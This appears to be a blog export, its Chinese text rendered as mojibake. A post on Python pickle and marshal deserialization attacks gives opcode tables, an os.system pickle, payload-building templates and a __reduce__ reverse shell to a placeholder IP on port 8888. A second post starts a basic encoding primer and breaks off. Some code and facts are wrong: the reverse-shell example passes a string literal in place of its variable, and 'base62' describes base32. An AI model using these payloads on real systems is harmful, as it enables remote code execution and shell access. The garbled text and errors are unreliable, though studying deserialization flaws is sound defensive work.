ˆ</td></tr><tr><td>)</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td>)</td><td>ç©ºå…ƒç»„å…¥æ ˆ</td></tr><tr><td>l</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td>l</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>]</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td>]</td><td>ç©ºåˆ—è¡¨å…¥æ ˆ</td></tr><tr><td>d</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td>d</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td>}</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td>}</td><td>ç©ºå­—å…¸å…¥æ ˆ</td></tr><tr><td>p</td><td>å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td>pn\n</td><td>æ— </td></tr><tr><td>g</td><td>å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td>gn\n</td><td>å¯¹è±¡è¢«å‹æ ˆ</td></tr><tr><td>0</td><td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td>0</td><td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td></tr><tr><td>b</td><td>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td>b</td><td>æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td></tr><tr><td>s</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td>s</td><td>ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td></tr><tr><td>u</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td>u</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td></tr><tr><td>a</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td>a</td><td>æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td></tr><tr><td>e</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td>e</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td></tr></tbody></table></div><p>è¦æƒ³çœŸæ­£çš„åˆ©ç”¨ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬è¿˜å¾—ä»åº•å±‚äº†è§£ä¸€ä¸‹pickleæ•°æ®çš„æ ¼å¼æ˜¯ä»€ä¹ˆæ ·çš„ã€‚</p><ul><li><code>c</code> è¯»å–æ–°çš„ä¸€è¡Œä½œä¸ºæ¨¡å—å<code>module</code>ï¼Œè¯»å–ä¸‹ä¸€è¡Œä½œä¸ºå¯¹è±¡å<code>object</code>ï¼Œç„¶åå°†<code>module.object</code>å‹å…¥åˆ°å †æ ˆä¸­ã€‚</li><li><code>(</code> å°†ä¸€ä¸ªæ ‡è®°å¯¹è±¡æ’å…¥åˆ°å †æ ˆä¸­ã€‚ä¸ºäº†å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œè¯¥æŒ‡ä»¤ä¼šä¸tæ­é…ä½¿ç”¨ï¼Œä»¥äº§ç”Ÿä¸€ä¸ªå…ƒç»„ã€‚</li><li><code>t</code> ä»å †æ ˆä¸­å¼¹å‡ºå¯¹è±¡ï¼Œç›´åˆ°ä¸€ä¸ª(è¢«å¼¹å‡ºï¼Œå¹¶åˆ›å»ºä¸€ä¸ªåŒ…å«å¼¹å‡ºå¯¹è±¡ï¼ˆé™¤äº†(ï¼‰çš„å…ƒç»„å¯¹è±¡ï¼Œå¹¶ä¸”è¿™äº›å¯¹è±¡çš„é¡ºåºå¿…é¡»è·Ÿå®ƒä»¬å‹å…¥å †æ ˆæ—¶çš„é¡ºåºä¸€è‡´ã€‚ç„¶åï¼Œè¯¥å…ƒç»„è¢«å‹å…¥åˆ°å †æ ˆä¸­ã€‚</li><li><code>S</code> è¯»å–å¼•å·ä¸­çš„å­—ç¬¦ä¸²ç›´åˆ°æ¢è¡Œç¬¦å¤„ï¼Œç„¶åå°†å®ƒå‹å…¥å †æ ˆã€‚</li><li><code>R</code> å°†ä¸€ä¸ªå…ƒç»„å’Œä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡å¼¹å‡ºå †æ ˆï¼Œç„¶åä»¥è¯¥å…ƒç»„ä½œä¸ºå‚æ•°è°ƒç”¨è¯¥å¯è°ƒç”¨çš„å¯¹è±¡ï¼Œæœ€åå°†ç»“æœå‹å…¥åˆ°å †æ ˆä¸­ã€‚</li><li><code>.</code> ç»“æŸpickle</li></ul><p>ç®€å•è¯´æ¥å°±æ˜¯ï¼š</p><ul><li><code>c</code> ä»¥cå¼€å§‹çš„åé¢ä¸¤è¡Œçš„ä½œç”¨ç±»ä¼¼<code>os.system</code>çš„è°ƒç”¨ï¼Œå…¶ä¸­<code>cos</code>åœ¨ç¬¬ä¸€è¡Œï¼Œ<code>system</code>åœ¨ç¬¬äºŒè¡Œã€‚</li><li><code>(</code> ç›¸å½“äºå·¦æ‹¬å·</li><li><code>t</code> ç›¸å½“äºå³æ‹¬å·</li><li><code>S</code> è¡¨ç¤ºæœ¬è¡Œçš„å†…å®¹ä¸€ä¸ªå­—ç¬¦ä¸²</li><li><code>R</code> æ‰§è¡Œç´§é è‡ªå·±å·¦è¾¹çš„ä¸€ä¸ªæ‹¬å·å¯¹ï¼ˆå³( å’Œtä¹‹é—´ï¼‰çš„å†…å®¹</li><li><code>.</code> ä»£è¡¨è¯¥pickleç»“æŸ</li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>ä¸Šæ–‡ä¸­çš„å­—èŠ‚ç å…¶å®å°±æ˜¯<code>os.system(&#39;whoami&#39;)</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cos         =&gt;  å¼•å…¥æ¨¡å— os.</span><br><span class="line">system      =&gt;  å¼•ç”¨ system, å¹¶å°†å…¶æ·»åŠ åˆ° stack.</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span>  =&gt;  æŠŠå½“å‰ stack å­˜åˆ° metastack, æ¸…ç©º stack, å†å°† <span class="string">&#x27;whoami&#x27;</span> å‹å…¥ stack.</span><br><span class="line">t           =&gt;  stack ä¸­çš„å€¼å¼¹å‡ºå¹¶è½¬ä¸º <span class="built_in">tuple</span>, æŠŠ metastack è¿˜åŸåˆ° stack, å†å°† <span class="built_in">tuple</span> å‹å…¥ stack.</span><br><span class="line">R           =&gt;  system(*(<span class="string">&#x27;whoami&#x27;</span>,)).</span><br><span class="line">.           =&gt;  ç»“æŸå¹¶è¿”å›å½“å‰æ ˆé¡¶å…ƒç´ .</span><br></pre></td></tr></table></figure><h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><h2 id="æ¼æ´å¸¸å‡ºç°çš„åœ°æ–¹"><a href="#æ¼æ´å¸¸å‡ºç°çš„åœ°æ–¹" class="headerlink" title="æ¼æ´å¸¸å‡ºç°çš„åœ°æ–¹"></a>æ¼æ´å¸¸å‡ºç°çš„åœ°æ–¹</h2><ol><li>é€šå¸¸åœ¨è§£æè®¤è¯<code>token</code>, <code>session</code>çš„æ—¶å€™. ç°åœ¨å¾ˆå¤š<code>Web</code>æœåŠ¡éƒ½ä½¿ç”¨<code>redis</code>ã€<code>mongodb</code>ã€<code>memcached</code>ç­‰æ¥å­˜å‚¨<code>session</code>ç­‰çŠ¶æ€ä¿¡æ¯.</li><li>å¯èƒ½å°†å¯¹è±¡<code>Pickle</code>åå­˜å‚¨æˆç£ç›˜æ–‡ä»¶.</li><li>å¯èƒ½å°†å¯¹è±¡<code>Pickle</code>ååœ¨ç½‘ç»œä¸­ä¼ è¾“.</li></ol><h2 id="æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="æ¼æ´åˆ©ç”¨æ–¹å¼"></a>æ¼æ´åˆ©ç”¨æ–¹å¼</h2><p>æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–, ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<code>__reduce__()</code>å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç .</p><p>ç®€å•æ¥è¯´, <code>__reduce__()</code>é­”æœ¯æ–¹æ³•ç±»ä¼¼äº<code>PHP</code>ä¸­çš„<code>__wakeup()</code>æ–¹æ³•, åœ¨ååºåˆ—åŒ–æ—¶ä¼šå…ˆè°ƒç”¨<code>__reduce__()</code>é­”æœ¯æ–¹æ³•.</p><ul><li><p>å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸², é‚£ä¹ˆå°†ä¼šå»å½“å‰ä½œç”¨åŸŸä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²å€¼å¯¹åº”åå­—çš„å¯¹è±¡, å°†å…¶åºåˆ—åŒ–ä¹‹åè¿”å›.</p></li><li><p>å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå…ƒç»„, è¦æ±‚æ˜¯2åˆ°6ä¸ªå‚æ•°(Python3.8æ–°åŠ å…¥å…ƒç»„çš„ç¬¬å…­é¡¹).</p><ol><li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯è°ƒç”¨çš„å¯¹è±¡.</li><li>ç¬¬äºŒä¸ªæ˜¯è¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„, å¦‚æœå¯è°ƒç”¨å¯¹è±¡ä¸æ¥å—å‚æ•°åˆ™å¿…é¡»æä¾›ä¸€ä¸ªç©ºå…ƒç»„.</li><li>ç¬¬ä¸‰ä¸ªæ˜¯ç”¨äºè¡¨ç¤ºå¯¹è±¡çš„çŠ¶æ€çš„å¯é€‰å…ƒç´ , å°†è¢«ä¼ ç»™å‰è¿°çš„<code>__setstate__()</code>æ–¹æ³•, å¦‚æœå¯¹è±¡æ²¡æœ‰æ­¤æ–¹æ³•, åˆ™è¿™ä¸ªå…ƒç´ å¿…é¡»æ˜¯å­—å…¸ç±»å‹å¹¶ä¼šè¢«æ·»åŠ è‡³<code>__dict__</code>å±æ€§ä¸­.</li><li>ç¬¬å››ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é¡¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ .</li><li>ç¬¬äº”ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é”®å€¼å¯¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ .</li><li>ç¬¬å…­ä¸ªæ˜¯ä¸€ä¸ªå¸¦æœ‰<code>(obj, state)</code>ç­¾åçš„å¯è°ƒç”¨å¯¹è±¡çš„å¯é€‰å…ƒç´ .</li></ol></li></ul><p><strong>ä¸¾ä¸ªä¾‹å­</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼š</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/python_02.png" alt=""></p><p>åå¼¹shellï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;shell&#x27;</span>,))    </span><br><span class="line">a=Demo()</span><br><span class="line">result = pickle.dumps(a)</span><br><span class="line">pickle.loads(result)</span><br></pre></td></tr></table></figure><h2 id="Marshal-ååºåˆ—åŒ–ï¼ˆä»»æ„ä»£ç æ‰§è¡Œï¼‰"><a href="#Marshal-ååºåˆ—åŒ–ï¼ˆä»»æ„ä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="Marshal ååºåˆ—åŒ–ï¼ˆä»»æ„ä»£ç æ‰§è¡Œï¼‰"></a>Marshal ååºåˆ—åŒ–ï¼ˆä»»æ„ä»£ç æ‰§è¡Œï¼‰</h2><p>ç”±äº<code>pickle</code>æ— æ³•åºåˆ—åŒ–<code>code</code>å¯¹è±¡, å› æ­¤åœ¨<code>python2.6</code>åå¢åŠ äº†ä¸€ä¸ª<code>marshal</code>æ¨¡å—æ¥å¤„ç†<code>code</code>å¯¹è±¡çš„åºåˆ—åŒ–é—®é¢˜.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(demo()))</span><br><span class="line"><span class="built_in">print</span>(code_serialized)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯<code>marshal</code>ä¸èƒ½ç›´æ¥ä½¿ç”¨<code>__reduce__</code>, å› ä¸º<code>reduce</code>æ˜¯åˆ©ç”¨è°ƒç”¨æŸä¸ª<code>callable</code>å¹¶ä¼ é€’å‚æ•°æ¥æ‰§è¡Œçš„, è€Œ<code>marshal</code>å‡½æ•°æœ¬èº«å°±æ˜¯ä¸€ä¸ª<code>callable</code>, éœ€è¦æ‰§è¡Œå®ƒ, è€Œä¸æ˜¯å°†ä»–ä½œä¸ºæŸä¸ªå‡½æ•°çš„å‚æ•°.</p><p>è¿™æ—¶å€™å°±è¦åˆ©ç”¨ä¸Šé¢åˆ†æçš„é‚£ä¸ª<code>PVM</code>æ“ä½œç æ¥è¿›è¡Œæ„é€ äº†, å…ˆå†™å‡ºæ¥éœ€è¦æ‰§è¡Œçš„å†…å®¹, <code>Python</code>èƒ½é€šè¿‡<code>types.FunctionTyle(func_code,globals(),&#39;&#39;)()</code>æ¥åŠ¨æ€åœ°åˆ›å»ºåŒ¿åå‡½æ•°, è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹å¯ä»¥çœ‹<a href="https://docs.python.org/3/library/types.html">å®˜æ–¹æ–‡æ¡£</a>çš„ä»‹ç».</p><p>ç»“åˆä¸Šæ–‡çš„ç¤ºä¾‹ä»£ç , æœ€é‡è¦æ‰§è¡Œçš„æ˜¯: <code>(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), &#39;&#39;))()</code>.</p><p><strong>payloadæ¨¡æ¿ï¼ˆpython2ï¼‰ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&#x27;whoami;/bin/sh&#x27;</span>)     <span class="comment"># evil code</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(shell))</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹è„šæœ¬æ„é€ payloadï¼Œå†æ ¹æ®å®é™…æƒ…å†µå¯¹payloadè¿›è¡Œurlç¼–ç ä¹‹ç±»çš„æ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>():</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># any code here</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(code.func_code))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MISC</title>
      <link href="/2023/07/29/MISC/"/>
      <url>/2023/07/29/MISC/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ç¼–ç åŸºç¡€"><a href="#ç¼–ç åŸºç¡€" class="headerlink" title="ç¼–ç åŸºç¡€"></a>ç¼–ç åŸºç¡€</h1><h2 id="å¸¸è§ç¼–ç "><a href="#å¸¸è§ç¼–ç " class="headerlink" title="å¸¸è§ç¼–ç "></a>å¸¸è§ç¼–ç </h2><h3 id="ASCIIç¼–ç "><a href="#ASCIIç¼–ç " class="headerlink" title="ASCIIç¼–ç "></a>ASCIIç¼–ç </h3><blockquote><p>ASCII (American Standard Code for Information Interchange)ï¼šç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç æ˜¯åŸºäºæ‹‰ä¸å­—æ¯çš„ä¸€å¥—ç”µè„‘ç¼–ç ç³»ç»Ÿï¼Œä¸»è¦ç”¨äºæ˜¾ç¤ºç°ä»£è‹±è¯­å’Œå…¶ä»–<a href="https://baike.baidu.com/item/è¥¿æ¬§/3028649?fromModule=lemma_inlink">è¥¿æ¬§</a>è¯­è¨€ã€‚</p></blockquote><p><strong>ASCIIç å¯¹ç…§è¡¨</strong></p><p><img src="https://www.runoob.com/wp-content/uploads/2022/03/ascii-1-1.png" alt=""></p><p><a href="https://coding.tools/cn/ascii-to-hex">åœ¨çº¿è½¬æ¢å·¥å…·</a></p><h3 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h3><blockquote><p>URLç¼–ç åˆå«ç™¾åˆ†å·ç¼–ç ï¼Œæ˜¯ç»Ÿä¸€èµ„æºå®šä½ï¼ˆURLï¼‰ç¼–ç æ–¹å¼ã€‚URLåœ°å€ï¼ˆå¸¸è¯´ç½‘å€ï¼‰è§„å®šäº†å¸¸ç”¨çš„æ•°å­—ï¼Œå­—æ¯å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå¦å¤–ä¸€æ‰¹ä½œä¸ºç‰¹æ®Šç”¨æˆ·å­—ç¬¦ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ï¼ˆ<code>/ , : @</code>ç­‰ï¼‰ï¼Œå‰©ä¸‹çš„å…¶ä»–æ‰€æœ‰å­—ç¬¦å¿…é¡»é€šè¿‡<code>%xx</code>ç¼–ç å¤„ç†ï¼Œç°åœ¨å·²ç»æˆä¸ºä¸€ç§è§„èŒƒäº†ï¼ŒåŸºæœ¬æ‰€æœ‰ç¨‹åºè¯­è¨€éƒ½æœ‰è¿™ç§ç¼–ç </p></blockquote><p><img src="/img/MISC/url.png" alt=""></p><p><a href="https://c.runoob.com/front-end/695/?">åœ¨çº¿å·¥å…·</a></p><h3 id="baseå®¶æ—ç¼–ç "><a href="#baseå®¶æ—ç¼–ç " class="headerlink" title="baseå®¶æ—ç¼–ç "></a>baseå®¶æ—ç¼–ç </h3><blockquote><p>base16 / base32 / base58 / base62 / base64 / base91 / base92 / base100</p></blockquote><p>base64çš„ç¼–ç è¡¨æ˜¯ç”±ï¼ˆ<strong>A-Zã€a-zã€0-9ã€+ã€/</strong>ï¼‰64ä¸ªå¯è§å­—ç¬¦æ„æˆï¼Œ<code>=</code>ç¬¦å·ç”¨ä½œåç¼€å¡«å……</p><p><strong>tipsï¼š</strong>ä¸€èˆ¬æƒ…å†µä¸‹å¯†æ–‡å°¾éƒ¨éƒ½ä¼šæœ‰ä¸¤ä¸ªç­‰å·</p><ul><li>base64ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±64ä¸ªå­—ç¬¦<code>(A-Z,a-z,0-9,+,/)</code>ç»„æˆï¼ŒåŒºåˆ†å­—æ¯å¤§å°å†™ï¼Œæœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ª<code>=</code> æœ€å¤šæœ‰2ä¸ªï¼Œæ˜æ–‡è¶Šé•¿æ•°å­—è¶Šé•¿</p><p>ç´¢å¼•è¡¨ï¼š</p><p><img src="/img/MISC/base64.webp" alt=""></p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><blockquote><p>æ–‡æœ¬ï¼šT h e</p><p>å¯¹åº”asciiç¼–ç ï¼š84 104 101</p><p>8ä½binaryï¼š01010100 01101000 01100101</p><p>6ä½binaryï¼š010101 000110 100001 100101</p><p>é«˜ä½è¡¥0ï¼š00010101 00000110 00100001 00100101</p><p>å¯¹ç”¨åè¿›åˆ¶ï¼š21 6 33 37</p><p>æŸ¥è¡¨ï¼šv G h l</p></blockquote><ul><li>base62ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±32ä¸ªå­—ç¬¦<code>(A-Z,2-7)</code>ç»„æˆï¼Œæœ«å°¾å¯èƒ½ä¼šæœ‰<code>=</code>ï¼Œä½†æœ€å¤šæœ‰6ä¸ª</p><ul><li>base16ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±16ä¸ªå­—ç¬¦<code>(0-9,A-F)</code>ç»„æˆ</p><ul><li>base36ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±36ä¸ªå­—ç¬¦<code>(0-9,a-z)</code>ç»„æˆï¼ŒåŠ å¯†ä»…æ”¯æŒæ•´æ•°æ•°å­—ï¼Œè§£å¯†ä»…æ”¯æŒå­—ç¬¦ä¸²ï¼Œä¸æ”¯æŒä¸­æ–‡</p><ul><li>base58ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šBase58æ˜¯ç”¨äºBitcoinä¸­ä½¿ç”¨çš„ä¸€ç§ç‹¬ç‰¹çš„ç¼–ç 